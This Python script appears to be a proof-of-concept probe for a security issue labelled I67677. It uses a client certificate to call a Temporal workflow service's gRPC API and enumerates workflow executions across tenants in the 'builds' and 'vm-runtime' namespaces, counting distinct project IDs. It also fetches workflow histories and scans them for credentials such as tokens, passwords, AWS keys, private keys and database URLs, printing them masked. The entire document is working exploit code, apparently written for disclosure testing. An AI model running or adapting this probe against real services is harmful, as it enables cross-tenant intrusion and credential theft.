#!/usr/bin/env python3
# I67677 probe4: masked evidence only (no raw secret values), + cross-tenant breadth count
import json, re
src = open('/probe.py').read().split("print('===I67677 PROBE START")[0]
ns = {}
exec(src, ns)
grpc_call = ns['grpc_call']; parse = ns['parse']; fs = ns['fs']; fv = ns['fv']; fmsg = ns['fmsg']
all_of = ns['all_of']; get1 = ns['get1']; frame_payload = ns['frame_payload']
T = '/temporal.api.workflowservice.v1.WorkflowService/'
SENS = re.compile(r'(?i)(token|secret|password|passwd|credential|accesskey|bearer|private_key|api_key|database_url|session)')
json_re = re.compile(rb'\{"', re.S)


def jsons_from(b, lim=6):
    out = []
    i = 0
    while len(out) < lim:
        m = json_re.search(b, i)
        if not m:
            break
        s = m.start(); depth = 0; j = s; inq = esc = False
        while j < len(b):
            c = b[j:j + 1]
            if inq:
                if esc: esc = False
                elif c == b'\\': esc = True
                elif c == b'"': inq = False
            else:
                if c == b'"': inq = True
                elif c == b'{': depth += 1
                elif c == b'}':
                    depth -= 1
                    if depth == 0: break
            j += 1
        if j < len(b) and 2 < j - s < 400000:
            try: out.append(json.loads(b[s:j + 1].decode('utf-8', 'replace')))
            except Exception: pass
        i = max(j, s + 2)
    return out


def mask(k, v):
    if not isinstance(v, str): return None
    l = len(v)
    kl = k.lower()
    if '@' in v and '://' in v:
        sch, rest = v.split('://', 1)
        cred, _, host = rest.rpartition('@')
        u = cred.split(':')[0] if ':' in cred else cred
        return '%s://%s:***@%s (len=%d)' % (sch, u[:18], host[:42], l)
    if re.match(r'^AKIA[0-9A-Z]{16}$', v): return 'AKIA***%s (len=%d)' % (v[-4:], l)
    if re.match(r'^ASIA[0-9A-Z]{16}$', v): return 'ASIA***%s (len=%d)' % (v[-4:], l)
    if v.startswith('ghp_') or v.startswith('github_pat_'): return v[:6] + '*** (len=%d)' % l
    if v.startswith('sk-'): return v[:6] + '*** (len=%d)' % l
    if v.startswith('-----BEGIN'): return v[:27] + '... (len=%d)' % l
    if l >= 24: return v[:3] + '***' + v[-2:] + ' (len=%d)' % l
    return '*** (len=%d)' % l


def walk(o, prefix, out):
    if isinstance(o, dict):
        for k, v in o.items():
            p = prefix + k
            if SENS.search(k) and isinstance(v, str):
                m = mask(k, v)
                if m: out.append((p, m))
            walk(v, p + '.', out)
    elif isinstance(o, list):
        for it in o[:3]: walk(it, prefix, out)


def list_execs(ns_, q='', size=10):
    r = grpc_call(T + 'ListWorkflowExecutions', fs(1, ns_) + fv(2, size) + (fs(4, q) if q else b''), timeout=20)
    out = []
    if r['st'] != '0': return out
    pl = frame_payload(r['data'])
    for ei in all_of(pl, 1):
        ex = get1(ei, 1) or b''
        wid = (get1(ex, 1) or b'').decode('utf-8', 'replace')
        rid = (get1(ex, 2) or b'').decode('utf-8', 'replace')
        ty = (get1(get1(ei, 2) or b'', 1) or b'').decode('utf-8', 'replace')
        if wid: out.append((wid, rid, ty))
    return out


print('===I67677-P4 START===', flush=True)
print('CERT=' + ns['subprocess'].run(['sh', '-c', 'openssl x509 -in /pki/client.crt -noout -subject'], capture_output=True, text=True).stdout.strip(), flush=True)

# breadth: distinct projectIDs across builds namespace (several pages)
projs = set(); svcs = set(); n = 0
tok = b''
for pg in range(3):
    req = fs(1, 'builds') + fv(2, 15) + (fmsg(4, tok) if tok else b'')
    r = grpc_call(T + 'ListWorkflowExecutions', req, timeout=20)
    if r['st'] != '0': break
    pl = frame_payload(r['data'])
    for ei in all_of(pl, 1):
        n += 1
        for j in jsons_from(ei, 2):
            pass
    for _, _, _, in []:
        pass
    # extract memo/searchattrs raw text for ids
    txt = pl.decode('utf-8', 'replace')
    for m in re.finditer(r'"projectID":"([0-9a-f-]{36})"', txt):
        projs.add(m.group(1))
    for m in re.finditer(r'ProjectID', txt):
        pass
    tok = get1(pl, 3) or b''
    if not tok: break
print('BREADTH|pages=%d|execs=%d|distinct_projectIDs=%d' % (pg + 1, n, len(projs)), flush=True)
print('   PROJECTS=' + ','.join(sorted(projs)[:12]), flush=True)

sel = []
for e in list_execs('builds', 'WorkflowType="ScheduleBuildAndPublishImage"', 4)[:2]:
    sel.append(('builds', e))
for e in list_execs('vm-runtime', 'WorkflowType="CreateVmWorkflow"', 3)[:1]:
    sel.append(('vm-runtime', e))
for e in list_execs('vm-runtime', 'WorkflowType="PullImageLayerWorkflow"', 2)[:1]:
    sel.append(('vm-runtime', e))

for ns_, (wid, rid, ty) in sel:
    r = grpc_call(T + 'GetWorkflowExecutionHistory', fs(1, ns_) + fmsg(2, fs(1, wid) + (fs(2, rid) if rid else b'')) + fv(3, 25), timeout=25)
    if r['st'] != '0':
        print('M|%s|%s|st=%s' % (ns_, ty, r['st']), flush=True); continue
    pl = frame_payload(r['data'])
    out = []
    ids = {}
    for j in jsons_from(pl):
        walk(j, '', out)
        if isinstance(j, dict):
            for k in ('identifiers', 'Identifiers'):
                if isinstance(j.get(k), dict):
                    for kk, vv in j[k].items():
                        if isinstance(vv, str): ids[k + '.' + kk] = vv[:40]
            if isinstance(j.get('envVars'), dict):
                ids['envVars.count'] = str(len(j['envVars']))
    seen = {}
    for p, m in out:
        if p not in seen: seen[p] = m
    print('M|%s|%s|len=%d|ids=%s' % (ns_, ty[:32], r['n'], ','.join('%s=%s' % (k, v) for k, v in sorted(ids.items())[:8])), flush=True)
    for p in sorted(seen)[:14]:
        print('   V|%s = %s' % (p, seen[p]), flush=True)
print('===I67677-P4 END===', flush=True)
